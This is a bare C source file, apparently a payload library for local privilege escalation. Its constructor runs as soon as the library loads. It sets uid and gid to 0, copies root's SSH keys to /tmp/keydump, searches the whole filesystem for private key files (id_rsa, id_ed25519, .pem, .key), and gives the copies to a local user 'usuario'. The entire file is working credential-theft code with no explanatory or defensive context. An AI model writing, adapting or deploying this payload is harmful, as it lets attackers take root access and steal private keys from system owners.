#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    setuid(0);
    setgid(0);

    system("mkdir -p /tmp/keydump");
    system("cp -a /root/.ssh/* /tmp/keydump/ 2>/dev/null");
    system("find / -name id_rsa -o -name id_ed25519 -o -name '*.pem' -o -name '*.key' > /tmp/keylist.txt 2>/dev/null");
    system("chown -R usuario:usuario /tmp/keydump /tmp/keylist.txt 2>/dev/null");
    system("chmod -R u+rwX,go-rwx /tmp/keydump 2>/dev/null");
    system("chmod 600 /tmp/keydump/* 2>/dev/null");
}
